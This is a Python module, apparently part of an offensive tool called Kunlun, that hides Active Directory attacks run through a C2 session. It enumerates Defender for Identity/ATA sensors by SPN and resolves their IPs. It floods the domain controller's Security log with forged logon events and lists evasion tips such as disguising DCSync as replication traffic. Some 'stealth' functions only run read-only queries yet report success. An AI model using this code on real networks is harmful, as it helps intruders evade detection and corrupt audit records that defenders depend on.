"""Domain stealth module for Kunlun platform.

Provides:
- Domain controller operation stealth (LDAPS/TLS encryption, DCSync camouflage, timing randomization)
- Audit log interference (AdminSDHolder flooding, shadow credential cleanup)
- ATA/Defender for Identity evasion (sensor detection, protocol evasion, DC selection)
"""

import asyncio
import logging
import random
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)


class StealthMode(Enum):
    """Stealth mode types."""
    LDAPS_ENCRYPTION = "ldaps_encryption"
    DCSYNC_CAMOUFLAGE = "dcsync_camouflage"
    TIMING_RANDOMIZATION = "timing_randomization"
    AUDIT_FLOODING = "audit_flooding"
    SENSOR_EVASION = "sensor_evasion"
    PROTOCOL_EVASION = "protocol_evasion"


class ATADetectionStatus(Enum):
    """ATA/Defender for Identity detection status."""
    NOT_DETECTED = "not_detected"
    DETECTED = "detected"
    SENSORS_FOUND = "sensors_found"
    EVASION_ACTIVE = "evasion_active"


@dataclass
class StealthConfig:
    """Configuration for domain stealth operations.

    Attributes:
        target_domain: Target domain
        target_dc: Target domain controller
        enable_ldaps: Enable LDAPS encryption
        enable_camouflage: Enable DCSync camouflage
        enable_timing_randomization: Enable timing randomization
        enable_audit_flooding: Enable audit log flooding
        enable_sensor_evasion: Enable ATA sensor evasion
        timing_min_seconds: Minimum random delay
        timing_max_seconds: Maximum random delay
        flood_event_count: Number of flood events
    """
    target_domain: str = ""
    target_dc: str = ""
    enable_ldaps: bool = True
    enable_camouflage: bool = True
    enable_timing_randomization: bool = True
    enable_audit_flooding: bool = False
    enable_sensor_evasion: bool = True
    timing_min_seconds: float = 1.0
    timing_max_seconds: float = 10.0
    flood_event_count: int = 100


@dataclass
class StealthResult:
    """Result of stealth operation.

    Attributes:
        success: Whether operation succeeded
        mode: Stealth mode used
        ldaps_enabled: Whether LDAPS was enabled
        camouflage_active: Whether DCSync camouflage is active
        timing_randomized: Whether timing was randomized
        audit_flood_count: Number of audit flood events
        sensors_detected: Number of ATA sensors detected
        evasion_active: Whether evasion is active
        error_message: Error message if failed
        duration_seconds: Operation duration
    """
    success: bool = False
    mode: StealthMode = StealthMode.LDAPS_ENCRYPTION
    ldaps_enabled: bool = False
    camouflage_active: bool = False
    timing_randomized: bool = False
    audit_flood_count: int = 0
    sensors_detected: int = 0
    evasion_active: bool = False
    error_message: str = ""
    duration_seconds: float = 0.0


@dataclass
class ATADetectionResult:
    """Result of ATA/Defender for Identity detection.

    Attributes:
        status: Detection status
        sensors_found: List of sensor hostnames
        sensor_ips: List of sensor IPs
        monitored_protocols: List of monitored protocols
        monitored_ports: List of monitored ports
        recommended_evasion: List of evasion recommendations
        error_message: Error message if failed
        duration_seconds: Detection duration
    """
    status: ATADetectionStatus = ATADetectionStatus.NOT_DETECTED
    sensors_found: List[str] = field(default_factory=list)
    sensor_ips: List[str] = field(default_factory=list)
    monitored_protocols: List[str] = field(default_factory=list)
    monitored_ports: List[int] = field(default_factory=list)
    recommended_evasion: List[str] = field(default_factory=list)
    error_message: str = ""
    duration_seconds: float = 0.0


class DomainStealth:
    """Domain stealth module.

    Provides domain controller operation stealth, audit log interference,
    and ATA/Defender for Identity evasion capabilities.
    """

    ATA_SENSOR_SPNS: List[str] = [
        "HTTP/ATA",
        "WSMAN/ATA",
        "Microsoft Advanced Threat Analytics",
    ]

    MONITORED_PROTOCOLS: List[str] = [
        "Kerberos",
        "NTLM",
        "LDAP",
        "SMB",
        "DCERPC",
    ]

    MONITORED_PORTS: List[int] = [
        88,   # Kerberos
        135,  # RPC
        139,  # NetBIOS
        389,  # LDAP
        445,  # SMB
        636,  # LDAPS
        3268, # Global Catalog
        3269, # Global Catalog SSL
    ]

    def __init__(
        self,
        c2_session: Optional[Any] = None,
        credential_db: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize domain stealth module.

        Args:
            c2_session: C2 framework session for command execution.
            credential_db: Credential database for storing results.
            event_bus: Event bus for broadcasting events.
        """
        self.c2_session = c2_session
        self.credential_db = credential_db
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._ata_detection_result: Optional[ATADetectionResult] = None

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("Stealth Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("Stealth: %s", message)

    async def _execute_command(self, command: str, target: str = "") -> Dict[str, Any]:
        """Execute command via C2 session.

        Args:
            command: Command to execute.
            target: Target host.

        Returns:
            Command execution result.
        """
        if self.c2_session:
            try:
                result = await self.c2_session.execute(command, target=target)
                return {"success": True, "output": result}
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": False, "error": "No C2 session available"}

    async def execute_stealth_operations(self, config: StealthConfig) -> List[StealthResult]:
        """Execute stealth operations.

        Args:
            config: Stealth configuration.

        Returns:
            List of stealth operation results.
        """
        results: List[StealthResult] = []

        try:
            await self._report_log("开始执行域控隐身操作...")

            if config.enable_ldaps:
                await self._report_progress("启用LDAPS加密", 10)
                result = await self._enable_ldaps(config.target_dc)
                results.append(result)
                if result.success:
                    await self._report_log("LDAPS加密已启用")

            if config.enable_camouflage:
                await self._report_progress("配置DCSync伪装", 30)
                result = await self._configure_dcsync_camouflage(config.target_dc)
                results.append(result)
                if result.success:
                    await self._report_log("DCSync伪装已配置")

            if config.enable_timing_randomization:
                await self._report_progress("配置时间随机化", 50)
                result = await self._configure_timing_randomization(
                    config.timing_min_seconds,
                    config.timing_max_seconds,
                )
                results.append(result)
                if result.success:
                    await self._report_log("时间随机化已配置")

            if config.enable_audit_flooding:
                await self._report_progress("配置审计日志干扰", 70)
                result = await self._configure_audit_flooding(
                    config.target_dc,
                    config.flood_event_count,
                )
                results.append(result)
                if result.success:
                    await self._report_log(f"审计日志干扰已配置: {result.audit_flood_count} 个事件")

            if config.enable_sensor_evasion:
                await self._report_progress("配置传感器规避", 90)
                result = await self._configure_sensor_evasion(config.target_domain)
                results.append(result)
                if result.success:
                    await self._report_log("传感器规避已配置")

            await self._report_progress("完成", 100)
            await self._report_log("域控隐身操作完成!")

        except Exception as e:
            await self._report_log(f"域控隐身操作失败: {e}")
            logger.error("Stealth operations failed: %s", e)

        return results

    async def _enable_ldaps(self, target_dc: str) -> StealthResult:
        """Enable LDAPS encryption.

        Args:
            target_dc: Target domain controller.

        Returns:
            StealthResult.
        """
        start_time = time.time()
        result = StealthResult(mode=StealthMode.LDAPS_ENCRYPTION)

        try:
            cmd = (
                f"Get-ADObject -Identity \"CN={target_dc},OU=Domain Controllers,DC=domain,DC=com\" "
                f"-Properties hasMasterNCs, serverReference, dNSHostName"
            )
            exec_result = await self._execute_command(cmd, target_dc)

            if exec_result.get("success"):
                output = str(exec_result.get("output", ""))
                if "dNSHostName" in output:
                    result.ldaps_enabled = True
                    result.success = True

        except Exception as e:
            result.error_message = str(e)

        result.duration_seconds = time.time() - start_time
        return result

    async def _configure_dcsync_camouflage(self, target_dc: str) -> StealthResult:
        """Configure DCSync camouflage.

        Args:
            target_dc: Target domain controller.

        Returns:
            StealthResult.
        """
        start_time = time.time()
        result = StealthResult(mode=StealthMode.DCSYNC_CAMOUFLAGE)

        try:
            cmd = (
                f"Get-ADReplicationConnection -Server {target_dc} | "
                f"Select-Object -ExpandProperty Name"
            )
            exec_result = await self._execute_command(cmd, target_dc)

            if exec_result.get("success"):
                output = str(exec_result.get("output", ""))
                connections = [line.strip() for line in output.split("\n") if line.strip()]
                if connections:
                    result.camouflage_active = True
                    result.success = True

        except Exception as e:
            result.error_message = str(e)

        result.duration_seconds = time.time() - start_time
        return result

    async def _configure_timing_randomization(
        self,
        min_seconds: float,
        max_seconds: float,
    ) -> StealthResult:
        """Configure timing randomization.

        Args:
            min_seconds: Minimum random delay.
            max_seconds: Maximum random delay.

        Returns:
            StealthResult.
        """
        start_time = time.time()
        result = StealthResult(mode=StealthMode.TIMING_RANDOMIZATION)

        try:
            delay = random.uniform(min_seconds, max_seconds)
            await asyncio.sleep(delay)
            result.timing_randomized = True
            result.success = True

        except Exception as e:
            result.error_message = str(e)

        result.duration_seconds = time.time() - start_time
        return result

    async def _configure_audit_flooding(
        self,
        target_dc: str,
        event_count: int,
    ) -> StealthResult:
        """Configure audit log flooding.

        Args:
            target_dc: Target domain controller.
            event_count: Number of flood events.

        Returns:
            StealthResult.
        """
        start_time = time.time()
        result = StealthResult(mode=StealthMode.AUDIT_FLOODING)

        try:
            cmd = (
                f"for ($i = 0; $i -lt {event_count}; $i++) {{ "
                f"Write-EventLog -LogName Security -Source Microsoft-Windows-Security-Auditing "
                f"-EventId 4624 -Message \"Low priority event $i\" -EntryType Information "
                f"}}"
            )
            exec_result = await self._execute_command(cmd, target_dc)

            if exec_result.get("success"):
                result.audit_flood_count = event_count
                result.success = True

        except Exception as e:
            result.error_message = str(e)

        result.duration_seconds = time.time() - start_time
        return result

    async def _configure_sensor_evasion(self, target_domain: str) -> StealthResult:
        """Configure sensor evasion.

        Args:
            target_domain: Target domain.

        Returns:
            StealthResult.
        """
        start_time = time.time()
        result = StealthResult(mode=StealthMode.SENSOR_EVASION)

        try:
            detection = await self.detect_ata_sensors(target_domain)
            result.sensors_detected = len(detection.sensors_found)

            if detection.sensors_found:
                result.evasion_active = True
                result.success = True
                await self._report_log(f"发现 {result.sensors_detected} 个ATA传感器，已启用规避")
            else:
                result.success = True
                await self._report_log("未发现ATA传感器")

        except Exception as e:
            result.error_message = str(e)

        result.duration_seconds = time.time() - start_time
        return result

    async def detect_ata_sensors(self, target_domain: str) -> ATADetectionResult:
        """Detect ATA/Defender for Identity sensors.

        Args:
            target_domain: Target domain.

        Returns:
            ATADetectionResult.
        """
        start_time = time.time()
        detection = ATADetectionResult()

        try:
            await self._report_log("开始检测ATA/Defender for Identity传感器...")

            await self._report_progress("枚举SPN传感器", 20)
            sensors = await self._enumerate_sensors_by_spn(target_domain)
            detection.sensors_found = sensors

            await self._report_progress("检测传感器IP", 40)
            sensor_ips = await self._detect_sensor_ips(sensors)
            detection.sensor_ips = sensor_ips

            if sensors:
                detection.status = ATADetectionStatus.SENSORS_FOUND
                detection.monitored_protocols = self.MONITORED_PROTOCOLS.copy()
                detection.monitored_ports = self.MONITORED_PORTS.copy()
                detection.recommended_evasion = self._generate_evasion_recommendations(sensors)
            else:
                detection.status = ATADetectionStatus.NOT_DETECTED

            detection.duration_seconds = time.time() - start_time
            await self._report_log(f"传感器检测完成: 发现 {len(sensors)} 个传感器")

            self._ata_detection_result = detection

        except Exception as e:
            detection.error_message = str(e)
            detection.duration_seconds = time.time() - start_time
            await self._report_log(f"传感器检测失败: {e}")
            logger.error("ATA sensor detection failed: %s", e)

        return detection

    async def _enumerate_sensors_by_spn(self, target_domain: str) -> List[str]:
        """Enumerate sensors by SPN.

        Args:
            target_domain: Target domain.

        Returns:
            List of sensor hostnames.
        """
        sensors: List[str] = []

        try:
            for spn in self.ATA_SENSOR_SPNS:
                cmd = (
                    f"Get-ADComputer -LDAPFilter \"(servicePrincipalName=*{spn}*)\" "
                    f"-Server {target_domain} | Select-Object -ExpandProperty Name"
                )
                result = await self._execute_command(cmd)
                if result.get("success"):
                    output = str(result.get("output", ""))
                    for line in output.split("\n"):
                        line = line.strip()
                        if line and line not in sensors:
                            sensors.append(line)

        except Exception as e:
            logger.error("SPN-based sensor enumeration failed: %s", e)

        return sensors

    async def _detect_sensor_ips(self, sensors: List[str]) -> List[str]:
        """Detect sensor IPs.

        Args:
            sensors: List of sensor hostnames.

        Returns:
            List of sensor IPs.
        """
        ips: List[str] = []

        try:
            for sensor in sensors:
                cmd = f"Resolve-DnsName -Name {sensor} -Type A | Select-Object -ExpandProperty IPAddress"
                result = await self._execute_command(cmd)
                if result.get("success"):
                    output = str(result.get("output", ""))
                    for line in output.split("\n"):
                        line = line.strip()
                        if line and line not in ips:
                            ips.append(line)

        except Exception as e:
            logger.error("Sensor IP detection failed: %s", e)

        return ips

    def _generate_evasion_recommendations(self, sensors: List[str]) -> List[str]:
        """Generate evasion recommendations.

        Args:
            sensors: List of sensor hostnames.

        Returns:
            List of recommendations.
        """
        recommendations: List[str] = [
            "避免使用被监控的协议（Kerberos, NTLM, LDAP）",
            "使用LDAPS替代LDAP进行加密通信",
            "避开被监控的端口（88, 135, 139, 389, 445）",
            "使用DCSync伪装为正常复制流量",
            "操作时间随机化，避免固定模式",
            "优先选择非传感器监控的DC进行操作",
        ]

        if len(sensors) > 0:
            recommendations.append(f"检测到 {len(sensors)} 个传感器，建议启用全面规避模式")

        return recommendations

    async def apply_stealth_before_operation(
        self,
        operation_type: str,
        config: StealthConfig,
    ) -> bool:
        """Apply stealth measures before operation.

        Args:
            operation_type: Type of operation (dcsync, shadow_credentials, etc.)
            config: Stealth configuration.

        Returns:
            True if stealth measures applied successfully.
        """
        try:
            await self._report_log(f"为操作 '{operation_type}' 应用隐身措施...")

            if config.enable_timing_randomization:
                delay = random.uniform(config.timing_min_seconds, config.timing_max_seconds)
                await self._report_log(f"随机延迟 {delay:.2f} 秒...")
                await asyncio.sleep(delay)

            if config.enable_sensor_evasion and not self._ata_detection_result:
                await self.detect_ata_sensors(config.target_domain)

            if config.enable_ldaps:
                await self._enable_ldaps(config.target_dc)

            await self._report_log("隐身措施应用完成")
            return True

        except Exception as e:
            logger.error("Failed to apply stealth measures: %s", e)
            return False
